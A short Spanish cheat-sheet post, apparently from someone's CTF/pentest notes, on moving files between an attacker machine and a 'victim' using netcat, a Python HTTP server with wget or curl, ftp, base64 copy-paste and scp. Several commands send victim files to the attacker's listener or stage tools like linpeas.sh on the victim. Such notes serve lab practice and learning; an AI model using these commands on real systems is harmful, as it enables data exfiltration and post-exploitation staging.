---
title: Pasar Archivos
author: guiseporaki
date: 2023-02-24
categories: [Linux, Cajón Verde]
tags: [Linux, Transferencia Archivos]
---
## Maneras de pasar archivos entre máquinas

En máquina víctima recuerda pasarte a un directorio con permiso de escritura, tanto en `/tmp` como en `/shm` no hay problema.

---

Con netcat. Para pasar archivo de máquina víctima a la mía.

En mi máquina, usaremos el puerto 4448 por ejemplo:
```  
> nc -nlvp 4448 > backup.tgz  
```  
Ahora desde la víctima:  
```
> nc MIIP 4448 < backup.tgz
```
Siguiendo con netcat pero ahora al revés, para enviar de mi máquina a la víctima:

En máquina víctima:
```
> nc -nlvp 4448 > linpeas.sh
```
En mi máquina:
```
> nc IPVICTIMA 4448 < linpeas.sh
```

-----------------
Ahora desde servidor **python**:  
Me creo servidor  
```
> python3 -m http.server <puerto> 
```
Y ya en máquina víctima desde  una carpeta con capacidad de escritura(/tmp o /shm por ejemplo):  
```
> wget http://<miIp>:<puerto>/<archivo> (si es puerto 80 no hace falta ponerlo).
```

Ó;  
```
> curl http://miIp/<archivo> --output <ruta>
```
-------------------
Desde conexión **ftp** establecida en máquina víctima:  
```
> prompt off (para que no pregunte)
> mget * (descargar todo)
> exit 
```
Si quisiera subir al ftp víctima:  
```
put  <nameArchivo> (archivo que este en carpeta desde donde me conecté)
```
Y ya la tendríamos sin hacer nada más.

-----------------
Si no hubiera ni nc, ni curl, ni wget:  
```
> base64 -w 0 <nombreArchivo> | xclip -sel clip
```
Ó;  
```
> base64 -w 0 <name>; echo (y copias)
```
Y en máquina destino:
```
> echo <cadenaCopiada> | base64 -d > <name>
```
Si es ejecutable recuerda: 
```
> chmod +x <ejecutable>
```
Contexto: lo hicimos en GOODGAMES para script de escaneo de puertos

----------------------
Si te sabes las credenciales por **ssh** tenemos la herramienta scp:  
```
> scp <user>@><ip>:<rutaDesdeElHomedelUser> <nameExportacion>
por ejemplo:
> scp tomy@10.10.11.152:user.txt user.txt
```
----------------------
Pasar archivos de un windows a un linux, mi parrot por ejemplo, visto JSON. Esta información la situaremos en el Post de PasarArchivos en carpeta Windows.
